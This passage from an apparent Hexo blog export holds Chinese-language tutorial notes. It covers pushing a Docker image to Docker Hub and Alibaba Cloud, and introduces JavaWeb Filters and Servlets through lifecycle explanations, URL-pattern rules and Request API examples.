<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push tangyt6/demo2:1</span><br><span class="line"></span><br><span class="line">[root@iZ2vc772r7963j25lx3cusZ <span class="built_in">test</span>]<span class="comment"># docker push tangyt6/demo2:1</span></span><br><span class="line">The push refers to repository [docker.io/tangyt6/demo2]</span><br><span class="line">3dba9e1d09df: Pushed </span><br><span class="line">35c20f26d188: Pushed </span><br><span class="line">c3fe59dd9556: Pushed </span><br><span class="line">6ed1a81ba5b6: Pushed </span><br><span class="line">a3483ce177ce: Pushed </span><br><span class="line">ce6c8756685b: Pushed </span><br><span class="line">30339f20ced0: Pushed </span><br><span class="line">0eb22bfb707d: Pushed </span><br><span class="line">a2ae92ffcd29: Pushed </span><br><span class="line">1: digest: sha256:6cc28f078ab5f94d9c4178d2c985b402dc40b81d0c3df84a78cb2bda67b53aba size: 2212 </span><br><span class="line"><span class="comment"># 成功</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133112.png" alt="  "></p>
<h1 id="六、发布镜像到阿里云"><a href="#六、发布镜像到阿里云" class="headerlink" title="六、发布镜像到阿里云"></a>六、发布镜像到阿里云</h1><ul>
<li>登录<a href="https://cn.aliyun.com/">阿里云</a></li>
<li>找到容器镜像服务</li>
<li>创建命名空间</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133123.png" alt="  "></p>
<ul>
<li>创建镜像仓库</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133115.png" alt="  "></p>
<p> <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133118.png" alt="  "></p>
<ul>
<li>参考官方文档操作即可<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133130.png" alt="  "></li>
</ul>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>容器</tag>
        <tag>运维</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-Filter介绍</title>
    <url>/posts/a6592200.html</url>
    <content><![CDATA[<h1 id="一、Filter介绍"><a href="#一、Filter介绍" class="headerlink" title="一、Filter介绍"></a>一、Filter介绍</h1><ul>
<li>概念：Filter表示过滤器，是JavaWeb三大组件（<a href="https://blog.csdn.net/qq_51938362/article/details/125703691?spm=1001.2014.3001.5502">Servlet</a>、Filter、Listener）之一。</li>
<li>过滤器可以把对web资源的请求<code>拦截</code>下来，做一些处理后再交给下一个过滤器或客户端。从而实现一些特殊的功能。</li>
<li>过滤器一般完成一些<code>通用操作</code>，比如：自动登录、权限控制、统一编码格式设置、敏感字符过滤等。<br><strong>Filter工作流程图如下：</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815161848.png"></p>
<h1 id="二、Filter开发步骤"><a href="#二、Filter开发步骤" class="headerlink" title="二、Filter开发步骤"></a>二、Filter开发步骤</h1><blockquote>
<p><strong>1、定义类，实现Filter接口，并重写其所有方法</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">  	<span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">    	<span class="comment">// 初始化方法，接受一个 FilterConfig 的参数，该参数是对Filter的配置</span></span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">    	<span class="comment">// 销毁时调用</span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res,</span></span><br><span class="line"><span class="params">                         FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    	<span class="comment">// 过滤方法，对 Resquest 与 Response 对象进行处理，之后交给其他Filter或服务器端</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>2、在<code>doFilter()</code>方法中配置过滤方法，对request和response进行处理，最后<code>放行</code></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res,</span></span><br><span class="line"><span class="params">						FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line">	System.out.println(<span class="string">&quot;过滤器执行---&quot;</span>);</span><br><span class="line">	response.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">// 放行</span></span><br><span class="line">	chain.doFilter(req, res);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>3、配置Filter<code>拦截资源</code>的路径，方法有2种。第一种使用<code>@WebFilter</code>注解；第二种在<code>web.xml</code>文件中进行配置</strong></p>
<p><strong>①在类上定义@WebFilter注解</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebFilter(filterName = &quot;myFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>②配置XML文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置Filter类路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>myFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.tyt.filter.FilterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置myFilter拦截的Servlet的映射路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>myFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="三、Filter执行流程"><a href="#三、Filter执行流程" class="headerlink" title="三、Filter执行流程"></a>三、Filter执行流程</h1><blockquote>
<p><strong>1. Filter放行后访问对应资源，资源访问完成后，还会再次<code>回到Filter</code>中。</strong><br><strong>2. 回到Filter中，执行<code>放行后的逻辑</code>。</strong></p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815161848.png"></p>
<h1 id="四、Filter详细使用"><a href="#四、Filter详细使用" class="headerlink" title="四、Filter详细使用"></a>四、Filter详细使用</h1><h2 id="1-Filter拦截路径配置"><a href="#1-Filter拦截路径配置" class="headerlink" title="1. Filter拦截路径配置"></a>1. Filter拦截路径配置</h2><ul>
<li>Filter可以根据需求，配置不同的拦截资源路径</li>
</ul>
<blockquote>
<ul>
<li><strong>拦截具体资源</strong>：<code>/index.html</code>，只有访问 index.html 时才会被拦截</li>
<li><strong>目录拦截</strong>：<code>/hello/*</code>，访问 &#x2F;hello 下的所有资源，都会被拦截</li>
<li><strong>后缀名拦截</strong>：<code>*.html</code>，访问所有 html 文件均会被拦截</li>
<li><strong>拦截所有</strong>：<code>/*</code>，访问所有资源，均会被拦截</li>
</ul>
</blockquote>
<h2 id="2-过滤器链"><a href="#2-过滤器链" class="headerlink" title="2.过滤器链"></a>2.过滤器链</h2><blockquote>
<ul>
<li><strong>一个Web应用，可以配置<code>多个</code>过滤器，这多个过滤器被称为过滤器链</strong></li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815161848.png"></p>
<h2 id="3-Filter执行顺序"><a href="#3-Filter执行顺序" class="headerlink" title="3.Filter执行顺序"></a>3.Filter执行顺序</h2><blockquote>
<p><strong>1. 注解配置的Filter：</strong><br>优先级按照过滤器的实现类类名（字符串）的自然排序。</p>
<hr>
<p><strong>2. xml配置的Filter：</strong><br>按在web.xml中配置<code>&lt;filter-mapping&gt;</code>的顺序，从上到下执行。</p>
<hr>
<p><strong>3. 既有注解配置也有xml配置：</strong><br>优先执行web.xml中配置的Filter。</p>
</blockquote>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-Servlet介绍</title>
    <url>/posts/e15cda61.html</url>
    <content><![CDATA[<h1 id="一、Servlet介绍"><a href="#一、Servlet介绍" class="headerlink" title="一、Servlet介绍"></a>一、Servlet介绍</h1><blockquote>
<p><strong>什么是&#x3D;&#x3D;Servlet&#x3D;&#x3D;？</strong></p>
<ul>
<li>Servlet是Java提供的一门&#x3D;&#x3D;动态Web&#x3D;&#x3D;资源开发技术</li>
<li>Servlet是JavaEE规范之一，其实就是一个接口，我们需要定义Servlet类实现Servlet接口，并且Web服务器运行Servlet。</li>
</ul>
</blockquote>
<h1 id="二、Servlet原生方式开发步骤"><a href="#二、Servlet原生方式开发步骤" class="headerlink" title="二、Servlet原生方式开发步骤"></a>二、Servlet原生方式开发步骤</h1><p>1、创建web项目，导入Servlet依赖坐标</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>2、创建：定义一个类实现Servlet接口，并重写接口中所有方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *   初始化方法</span></span><br><span class="line"><span class="comment">     *   1.调用时机：默认情况下，Servlet被第一次访问时调用（更改loadOnStartup）     · </span></span><br><span class="line"><span class="comment">     *   2.调用次数：1次 */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *   提供服务</span></span><br><span class="line"><span class="comment">     *   1、调用时机：每一次Servlet被访问时调用</span></span><br><span class="line"><span class="comment">     *   2、调用次数：多次 */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest,</span></span><br><span class="line"><span class="params">     	ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">		<span class="comment">// 根据请求方式不同，进行分别的处理</span></span><br><span class="line">		<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">		<span class="comment">// 1. 获取请求方式</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">		<span class="comment">// 2. 判断请求方式</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&quot;GET&quot;</span>.equals(method))&#123;</span><br><span class="line">			<span class="comment">// GET 请求方式处理逻辑</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;POST&quot;</span>.equals(method))&#123;</span><br><span class="line">			<span class="comment">// POST 请求方式处理逻辑</span></span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *   销毁服务</span></span><br><span class="line"><span class="comment">     *   1.调用时机：内存释放或者服务器关闭的时候，Servlet对象会被销毁调用</span></span><br><span class="line"><span class="comment">     *   2.调用次数：1次*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   获取 ServletConfig 对象*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   获取 Servlet信息*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3、配置：在类上使用@WebServlet注解，配置该Servlet的访问路径</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/资源访问路径&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span></span><br></pre></td></tr></table></figure>

<h1 id="三、Servlet执行流程-生命周期"><a href="#三、Servlet执行流程-生命周期" class="headerlink" title="三、Servlet执行流程&amp;生命周期"></a>三、Servlet执行流程&amp;生命周期</h1><blockquote>
<p><strong>1. Servlet由谁创建？Servlet方法有谁调用？</strong></p>
<ul>
<li>Servlet由Web服务器创建，Servlet方法由Web服务器调用</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p><strong>2. 服务器怎么知道Servlet 中一定有service方法？</strong></p>
<ul>
<li>自定义的Servlet必须实现Servlet接口并复写方法，而Servlet中有service方法</li>
</ul>
</blockquote>
<p><strong>Servlet生命周期</strong></p>
<ul>
<li>对象的生命周期指一个对象从被创建到被销毁的整个过程<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
<li>Servlet运行在Servlet容器（Web服务器）中，其生命周期由容器来管理，分为4个阶段：</li>
</ul>
<blockquote>
<p>&#x3D;&#x3D;<strong>①加载和实例化</strong>&#x3D;&#x3D;：默认情况下，当Servlet第一次被访问时，由容器创建<code>Servlet对象</code>。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162552.png"><br>可在<code>@WebServlet</code>注解上设置<code>loadOnStartup</code>的值来设定什么时候创建Servlet对象<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162552.png"><br><br><br>&#x3D;&#x3D;<strong>②初始化</strong>&#x3D;&#x3D;：在Servlet实例化之后，容器将调用Servlet的 <code>init()</code>方法初始化这个对象，完成一些如加载配置文件、创建连接等初始化的工作。该方法只会调用<strong>一次</strong>。<br><br><br>&#x3D;&#x3D;<strong>③请求处理</strong>&#x3D;&#x3D;：每次请求Servlet时，Servlet容器都会调用Servlet的<code>service()</code>方法对请求做出处理。<br><br><br>&#x3D;&#x3D;<strong>④服务终止</strong>&#x3D;&#x3D;：当需要释放内存或容器关闭时，容器就会调用Servlet实例的<code>destroy()</code>方法完成资源的释放。在<code>destroy()</code>方法调用之后，容器将会释放这个Servlet实例，该实例随后会被Java的垃圾收集器回收。</p>
</blockquote>
<h1 id="四、Servlet体系结构"><a href="#四、Servlet体系结构" class="headerlink" title="四、Servlet体系结构"></a>四、Servlet体系结构</h1><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162552.png"></p>
<blockquote>
<p>我们在开发<code>B/S架构</code>的Web项目时，都是针对于<code>HTTP协议</code>，所以我们自定义Servlet，会继承<code>HttpServlet</code>。</p>
</blockquote>
<h2 id="1-继承HttpServle书写Servlet开发步骤"><a href="#1-继承HttpServle书写Servlet开发步骤" class="headerlink" title="1. 继承HttpServle书写Servlet开发步骤"></a>1. 继承HttpServle书写Servlet开发步骤</h2><p>&#x3D;&#x3D;①继承HttpServlet&#x3D;&#x3D;<br><br>&#x3D;&#x3D;②重写doGet和doPost方法&#x3D;&#x3D;（若有其他请求方式，也直接重写即可，例如<code>doPut()</code>、<code>doDelete()</code>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">    								<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">    								<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-Servlet-urlPattern配置"><a href="#2-Servlet-urlPattern配置" class="headerlink" title="2. Servlet urlPattern配置"></a>2. Servlet urlPattern配置</h2><ul>
<li>Servlet要被访问，必须配置其访问路径（urlPattern）</li>
</ul>
<p><strong>1. 一个Servlet，可以配置多个urlPatter</strong>n</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(urlPattern = &#123;&quot;/demo1&quot;, &quot;/demo2&quot; ...&#125;)</span></span><br></pre></td></tr></table></figure>
<p><strong>2. urlPattern配置规则</strong></p>
<blockquote>
<p>&#x3D;&#x3D;<strong>① 精确匹配</strong>&#x3D;&#x3D;</p>
<ul>
<li><strong>配置路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162552.png"></li>
<li><strong>访问路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162552.png"></li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>&#x3D;&#x3D; ② 目录匹配&#x3D;&#x3D;</p>
<ul>
<li><strong>配置路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
<li><strong>访问路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>&#x3D;&#x3D;③ 扩展名匹配&#x3D;&#x3D;</p>
<ul>
<li><strong>配置路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
<li><strong>访问路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>&#x3D;&#x3D;④ 任意匹配&#x3D;&#x3D;</p>
<ul>
<li><strong>配置路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
<li><strong>访问路径</strong>：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
</ul>
</blockquote>
<h1 id="五、Servlet重要对象"><a href="#五、Servlet重要对象" class="headerlink" title="五、Servlet重要对象"></a>五、Servlet重要对象</h1><h2 id="1-Request"><a href="#1-Request" class="headerlink" title="1. Request"></a>1. Request</h2><h3 id="Request对象常用方法"><a href="#Request对象常用方法" class="headerlink" title="Request对象常用方法"></a>Request对象常用方法</h3><blockquote>
<p><strong>Requesst用于获取请求数据</strong>。例如：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">								<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="comment">// 使用 Request 对象获取请求数据</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Request对象获取请求行数据的方法：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取请求方式</span></span><br><span class="line">String <span class="title function_">getMethod</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">// 获取虚拟目录（项目访问路径）：/servlet_study</span></span><br><span class="line">String <span class="title function_">getContextPath</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">// 获取URL（统一资源定位符）：http://localhost:8080/servlet_study/demo</span></span><br><span class="line">StringBuffer <span class="title function_">getRequestURL</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">// 获取URI（统一资源标识符）：/servlet_study/demo</span></span><br><span class="line">String <span class="title function_">getRequestURI</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">// 获取请求参数（GET方式）：username=zs&amp;age=18</span></span><br><span class="line">String <span class="title function_">getQueryString</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Request对象获取请求头数据的方法：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据请求头名称，获取值</span></span><br><span class="line">String <span class="title function_">getHeader</span><span class="params">(String name)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Request对象获取请求体数据的方法：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取字节输入流</span></span><br><span class="line">ServletInputStream <span class="title function_">getInputStream</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">// 获取字符输入流</span></span><br><span class="line">BufferedReader <span class="title function_">getReader</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>
<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">									<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> req.getMethod();</span><br><span class="line">        <span class="type">String</span> <span class="variable">contextPath</span> <span class="operator">=</span> req.getContextPath();</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">requestURL</span> <span class="operator">=</span> req.getRequestURL();</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> req.getRequestURI();</span><br><span class="line">        <span class="type">String</span> <span class="variable">queryString</span> <span class="operator">=</span> req.getQueryString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">userAgent</span> <span class="operator">=</span> req.getHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span><br><span class="line">									<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 1. 获取字符输入流</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> req.getReader();</span><br><span class="line">        <span class="comment">// 2. 读取数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Request通用方式获取请求参数"><a href="#Request通用方式获取请求参数" class="headerlink" title="Request通用方式获取请求参数"></a>Request通用方式获取请求参数</h3><blockquote>
<ul>
<li><code>Map&lt;String,String[]&gt; getParameterMap</code>：获取所有参数的Map集合</li>
<li><code>String[] getParameterValues(String name)</code>：根据名称获取参数值（数组）</li>
<li><code>String getParameter(String name)</code>：根据名称获取参数值（单值）</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有参数的Map集合</span></span><br><span class="line">Map&lt;String, String[]&gt; map = req.getParameterMap();</span><br><span class="line"><span class="comment">// 根据名称获取参数值（数组）</span></span><br><span class="line">String[] values = req.getParameterValues(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="comment">// 根据名称获取参数值（单值）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="请求参数中文乱码问题"><a href="#请求参数中文乱码问题" class="headerlink" title="请求参数中文乱码问题"></a>请求参数中文乱码问题</h3><ul>
<li>请求参数如果存在中文数据，则会乱码。</li>
<li>解决方案：</li>
</ul>
<blockquote>
<p><strong>POST请求：设置输入流的编码</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br></pre></td></tr></table></figure>
<hr>
<blockquote>
<p><strong>GET请求：转换字符编码形式（先以<code>ISO-8859-1</code>形式编码，再以<code>utf-8</code>形式解码）</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两种方式</span></span><br><span class="line"><span class="comment">// 1.</span></span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> URLEncoder.encode(value, <span class="string">&quot;ISO-8859-1&quot;</span>);</span><br><span class="line">value = URLDecoder.decode(encode, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line">value = <span class="keyword">new</span> <span class="title class_">String</span>(value.getBytes(StandardCharsets.ISO_8859_1), </span><br><span class="line">										StandardCharsets.UTF_8);</span><br><span class="line"><span class="comment">// value 就是最终形式正常的数据</span></span><br></pre></td></tr></table></figure>
<h3 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h3><ul>
<li><strong>请求转发（forward）：一种在服务器内部的资源跳转方式</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162553.png"></li>
